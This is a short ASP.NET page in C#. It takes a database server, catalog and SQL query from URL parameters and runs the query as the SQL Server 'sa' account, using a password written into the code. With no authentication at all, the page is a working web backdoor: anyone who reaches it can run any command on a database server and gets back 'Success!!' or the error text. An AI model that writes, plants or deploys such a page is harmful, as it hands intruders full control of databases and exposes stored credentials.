<%@ Page Language="C#" Debug="true" %>
    <script language="c#" runat="server">
        public void Page_Load()
        {
			string source = Request.QueryString["source"];
            string catalog = Request.QueryString["catalog"];
            string query = Request.QueryString["query"];

            string connstring = "Data Source=" + source + ",1799;Network Library=DBMSSOCN;Initial Catalog=" + catalog + ";User ID=sa;Password=artsql963";      
            System.Data.SqlClient.SqlConnection conn = new System.Data.SqlClient.SqlConnection();
            conn.ConnectionString = connstring;
            try
            {
                conn.Open();
                System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(query, conn);
                cmd.ExecuteNonQuery();
                
            }
            catch (Exception ex)
            {
                Response.Clear();
                Response.Write(ex.Message);
            }
            finally
            {
                conn.Close();
                Response.Clear();
                Response.Write("Success!!");
            }          
        }
        
    </script>
